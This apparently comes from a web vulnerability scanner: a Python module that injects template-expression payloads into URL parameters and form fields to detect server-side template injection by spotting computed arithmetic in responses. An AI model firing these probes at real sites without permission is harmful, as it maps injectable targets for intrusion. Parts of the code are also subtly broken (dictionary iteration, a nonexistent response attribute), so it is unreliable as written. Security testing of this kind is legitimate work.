# -*- coding: utf-8 -*-
"""
"* Author     : M0nk3y"
"* Version    : 1.0"
"""
import requests
from utils.utils import print_roundtrip
import random


headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36',
    'Connection': 'keep-alive',
}

ssti_payloads = ["{{num1*num2}}",
                 "{{num1*num2}}[[{num1}*{num2}]]",
                 "<%= num1 * num2 %>",
                 "${num1*num2}",
                 "${num1*num2}}",
                 "@(num1+num2)",
                 "#{num1*num2}",
                 "{{num1 + num2}}",
                 "{{num1+num2}}[[{num1}+{num2}]]",
                 "<%= num1 + num2 %>",
                 "${num1+num2}",
                 "${num1+num2}}",
                 "@(num1*num2)",
                 "#{num1+num2}",
                 ]

def ssti_attack(data):
    final_data = {}
    if 'url' in data:
        url = data['url'] + '?'
        params = data['params']

        origin_params = params
        for key in params:
            for payload in ssti_payloads:
                num1 = random.randint(1000000000, 100000000000)
                num2 = random.randint(2000000000, 120000000000)
                target = [num1 + num2, num1 * num2]
                payload = payload.replace("num1", str(num1))
                payload = payload.replace("num2", str(num2))

                # 判断传的是几个参数, 一个直接赋值 多个需要加&
                if len(params) == 1:
                    url += key + "=" + payload
                else:
                    params[key] = payload
                    for k, v in params:
                        param_data = k + "=" + v + "&"
                        url += param_data
                    url = url[:-1]  # 删除最后一个&
                # 有可能会报错 所有TODO: 拼接的时候需要判断一下
                try:
                    r = requests.get(url=url, headers=headers, hooks={"response": print_roundtrip})
                except:
                    continue

                if check_ssti_result(r, target):
                    final_data[url] = ["ssti", r.result]
                    return final_data
                else:
                    pass

            url = data['url'] + '?'
            params = origin_params

    # form
    else:
        url = data['action']
        inputs = data['input_data']
        form_data = {}

        for my_input in inputs:
            if my_input[1]:
                form_data[my_input[0]] = my_input[1]

            else:
                form_data[my_input[0]] = ""
        for payload in ssti_payloads:
            num1 = random.randint(10000000, 20000000)
            num2 = random.randint(20000000, 30000000)
            target = [num1 + num2, num1 * num2]
            payload = payload.replace("num1", str(num1))
            payload = payload.replace("num2", str(num2))

            for my_input in inputs:
                if my_input[1] == "":
                    form_data[my_input[0]] = payload
            r = requests.post(url=url, headers=headers, data=form_data, verify=False, hooks={"response": print_roundtrip})
            if check_ssti_result(r, target):
                final_data[url] = ['ssti', r.result]
                return final_data
            r = requests.get(url=url, headers=headers, data=form_data, verify=False, hooks={"response": print_roundtrip})
            if check_ssti_result(r, target):
                final_data[url] = ["ssti", r.result]
                return final_data

def check_ssti_result(r, target):
    if any(str(k) in r.text for k in target):
        return True
    else:
        return False

def get_ssti_payloads():
    return ssti_payloads
